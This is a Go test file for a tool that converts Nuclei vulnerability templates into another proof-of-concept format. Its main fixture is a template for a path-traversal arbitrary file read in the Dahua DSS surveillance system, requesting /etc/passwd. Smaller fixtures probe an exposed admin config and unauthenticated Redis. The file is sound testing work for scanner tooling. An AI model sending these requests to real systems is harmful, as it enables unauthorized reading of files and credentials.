package convert

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"pocworkbench/internal/model"
	"pocworkbench/internal/pwf"
)

const nucleiSample = `id: dahuaDSS-attachment_downloadAtt_action-File-reading-XVE-2024-34436

info:
  name: 大华DSS数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞(XVE-2024-34436)
  author: Superhero
  severity: high
  description: |-
    fofa: app="dahua-DSS"
    大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞。
  reference:
    - https://mp.weixin.qq.com/s/example
  tags: File reading

http:
  - raw:
      - |
        GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
          - '/bin/bash'
        condition: and
      - type: status
        status:
          - 200
`

func mustNuclei(t *testing.T, src string) *model.Draft {
	t.Helper()
	d, err := NucleiToDraft(src)
	if err != nil {
		t.Fatalf("转换失败: %v", err)
	}
	if _, err := pwf.ValidateSpec(d.SpecYAML); err != nil {
		t.Fatalf("产物未通过三关校验: %v\nspec:\n%s", err, d.SpecYAML)
	}
	return d
}

// 用户真实样例：raw 报文 + word(and)+status 的组合，必须端到端转成可执行 PWF。
func TestNucleiSampleRawAndMatchers(t *testing.T) {
	d := mustNuclei(t, nucleiSample)

	if !strings.Contains(d.Name, "大华DSS") || !strings.Contains(d.Name, "任意文件读取") {
		t.Errorf("name 应来自 info.name: %q", d.Name)
	}
	if d.Severity != "high" {
		t.Errorf("severity=high, got %s", d.Severity)
	}
	if d.Category != "fileread" {
		t.Errorf("应按描述归类 fileread, got %s", d.Category)
	}
	if d.Source != FormatNuclei {
		t.Errorf("source 应为 nuclei, got %s", d.Source)
	}
	joined := strings.Join(d.Aliases, ",")
	if !strings.Contains(joined, "XVE-2024-34436") || !strings.Contains(joined, nucleiSampleID()) {
		t.Errorf("别名应含 XVE 与模板 id: %s", joined)
	}
	if len(d.Tags) != 2 || d.Tags[0] != "File" || d.Tags[1] != "reading" {
		t.Errorf("tags 应为 [File reading]: %v", d.Tags)
	}
	if !strings.Contains(d.Desc, "fofa") || !strings.Contains(d.Desc, "参考:") {
		t.Errorf("描述应含原文与参考链接: %q", d.Desc)
	}

	var spec model.Spec
	if err := yaml.Unmarshal([]byte(d.SpecYAML), &spec); err != nil {
		t.Fatal(err)
	}
	if spec.Transport != "http" || len(spec.Rules) != 1 {
		t.Fatalf("应为 http 单规则: transport=%s rules=%d", spec.Transport, len(spec.Rules))
	}
	r := spec.Rules["r0"]
	if r.Request.Method != "GET" {
		t.Errorf("method=GET, got %q", r.Request.Method)
	}
	wantPath := "/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd"
	if r.Request.Path != wantPath {
		t.Errorf("path 不符:\n got %q\nwant %q", r.Request.Path, wantPath)
	}
	if _, hasHost := r.Request.Headers["Host"]; hasHost {
		t.Error("Host 头应被剥离")
	}
	if !strings.Contains(r.Request.Headers["User-Agent"], "Mozilla/5.0") {
		t.Errorf("UA 头应保留: %v", r.Request.Headers)
	}
	for _, needle := range []string{
		`response.body.bcontains(b'root:')`,
		`response.body.bcontains(b'/bin/bash')`,
		"response.status == 200",
	} {
		if !strings.Contains(r.Expression, needle) {
			t.Errorf("表达式缺少 %q:\n%s", needle, r.Expression)
		}
	}
	if strings.Count(r.Expression, "&&") != 2 {
		t.Errorf("word 内部 and 与组间 and 应各贡献一个 &&: %s", r.Expression)
	}
	warned := strings.Join(d.Warnings, "\n")
	if !strings.Contains(warned, "Host 头") || !strings.Contains(warned, "UNKNOWN") {
		t.Errorf("应有 Host 剥离与 UNKNOWN 提示:\n%s", warned)
	}
}

func nucleiSampleID() string { return "dahuaDSS-attachment_downloadAtt_action-File-reading-XVE-2024-34436" }

// path 型请求：{{BaseURL}} 剥离、多 matcher 默认 or 合并。
func TestNucleiPathBaseURLDefaultOr(t *testing.T) {
	src := `id: t1
info:
  name: demo poc
  severity: critical
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/config.json"
    matchers:
      - type: word
        words:
          - '"admin_user"'
      - type: regex
        regex:
          - 'password.{0,20}'
`
	d := mustNuclei(t, src)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	r := spec.Rules["r0"]
	if r.Request.Path != "/admin/config.json" {
		t.Errorf("路径应剥离变量: %q", r.Request.Path)
	}
	if d.Severity != "critical" {
		t.Errorf("severity=critical, got %s", d.Severity)
	}
	if !strings.Contains(r.Expression, "||") || !strings.Contains(r.Expression, `bmatches('password.{0,20}')`) {
		t.Errorf("默认 or 合并与正则透传异常: %s", r.Expression)
	}
}

// case-insensitive word → (?i) 字面正则； QuoteMeta 防止内容被当语法。
func TestNucleiCaseInsensitiveWord(t *testing.T) {
	src := `id: t2
info:
  name: ci demo
http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        case-insensitive: true
        words:
          - "ROOT:X:0:0"
`
	d := mustNuclei(t, src)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	expr := spec.Rules["r0"].Expression
	if !strings.Contains(expr, `bmatches('(?i)ROOT:X:0:0')`) {
		t.Errorf("CI word 应转为 (?i) 字面正则: %s", expr)
	}
}

// binary hex 容忍空格分隔与 \x 前缀两种形态；解码结果以 \xNN 字面量嵌入。
func TestNucleiBinaryHex(t *testing.T) {
	src := `id: t3
info:
  name: bin demo
http:
  - method: GET
    path:
      - "{{BaseURL}}/x"
    matchers:
      - type: binary
        binary:
          - "50 4B 03 04"
`
	d := mustNuclei(t, src)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	expr := spec.Rules["r0"].Expression
	if !strings.Contains(expr, `bcontains(b'PK\x03\x04')`) && !strings.Contains(expr, `bcontains(b'PK\x03\x04')`) {
		t.Errorf("hex 应解码为字节字面量: %s", expr)
	}
}

// 无法转换的 matcher（dsl）安全跳过并记录；全不可用时明确报错。
func TestNucleiPatcherSkipAndError(t *testing.T) {
	partial := `id: t4
info:
  name: partial dsl
http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: word
        words: ["ok"]
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "x")'
`
	d := mustNuclei(t, partial)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	if spec.Rules["r0"].Expression != `response.body.bcontains(b'ok')` {
		t.Fatalf("dsl 跳过后仅剩 word: %s", spec.Rules["r0"].Expression)
	}
	if !strings.Contains(strings.Join(d.Warnings, "\n"), "暂不支持自动转换") {
		t.Errorf("应有 dsl 跳过警告: %v", d.Warnings)
	}

	allBad := `id: t4b
info:
  name: all unsupported
http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
`
	if _, err := NucleiToDraft(allBad); err == nil || !strings.Contains(err.Error(), "全部 matchers") {
		t.Fatalf("全部不可用应报错, got %v", err)
	}
}

// path 残留未知模板变量应直接报错（禁止静默按字面发请求）。
func TestNucleiPathLeftoverVarErrors(t *testing.T) {
	src := `id: t5
info:
  name: fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?x={{payload_test}}"
    matchers:
      - type: status
        status: [200]
`
	if _, err := NucleiToDraft(src); err == nil || !strings.Contains(err.Error(), "不受支持的模板变量") {
		t.Fatalf("残留变量应报错, got %v", err)
	}
}

// tcp/network：inputs 与 read-timeout 映射；tcp 下 status 匹配面跳过有提示。
func TestNucleiTCPInputs(t *testing.T) {
	src := `id: t6
info:
  name: redis unauth
  severity: high
tcp:
  - host: "{{Hostname}}"
    port: 6379
    read-timeout: 2
    inputs:
      - data: "PING\r\n"
    matchers:
      - type: word
        words: ["+PONG"]
`
	d := mustNuclei(t, src)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	if spec.Transport != "tcp" {
		t.Fatalf("transport=tcp, got %s", spec.Transport)
	}
	r := spec.Rules["r0"]
	if len(r.Request.Inputs) != 1 || r.Request.Inputs[0].Data != "PING\r\n" { // YAML 双引号转义在解析层完成
		t.Errorf("inputs 未映射: %+v", r.Request.Inputs)
	}
	if r.Request.ReadTimeout != 2 {
		t.Errorf("read-timeout=2, got %d", r.Request.ReadTimeout)
	}
	if !strings.Contains(r.Expression, "response.raw.bcontains(b'+PONG')") {
		t.Errorf("tcp word 应作用在 response.raw: %s", r.Expression)
	}
	if !strings.Contains(strings.Join(d.Warnings, "\n"), "host:port") {
		t.Errorf("应提示目标端口自行填写: %v", d.Warnings)
	}
}

// 多请求：path 数组多个条目生成多条规则并按 matchers-condition 合并总表达式。
func TestNucleiMultiRuleChain(t *testing.T) {
	src := `id: t7
info:
  name: multi path
http:
  - method: GET
    path:
      - "{{BaseURL}}/a"
      - "{{BaseURL}}/b"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
`
	d := mustNuclei(t, src)
	var spec model.Spec
	_ = yaml.Unmarshal([]byte(d.SpecYAML), &spec)
	if len(spec.Rules) != 2 || spec.Expression != "r0() && r1()" {
		t.Fatalf("两条路径应合并 r0() && r1(): rules=%d expr=%s", len(spec.Rules), spec.Expression)
	}
}

func TestDetectFormatMatrix(t *testing.T) {
	cases := map[string]string{
		nucleiSample: FormatNuclei,
		"id: x\ninfo:\n  name: only meta":                          FormatNuclei,
		"name: y\ntransport: http\nrules:\n  r0:\n    request: {}\nexpression: r0()": FormatXray,
		"id: z\nrandom_key: 1":                     FormatUnknown,
	}
	for src, want := range cases {
		if got := DetectFormat(src); got != want {
			t.Errorf("DetectFormat(%q)= %s, want %s", truncRunesHelper(src), got, want)
		}
	}
}

func truncRunesHelper(s string) string {
	if len(s) > 24 {
		return s[:24]
	}
	return s
}
